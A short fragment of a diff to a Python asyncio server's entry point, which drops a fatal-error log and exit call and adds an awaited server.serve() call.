-        logger.error("Fatal error: %s", e)
-        sys.exit(1)
+    await server.serve()
 
 
 if __name__ == "__main__":
     asyncio.run(main())
+
+
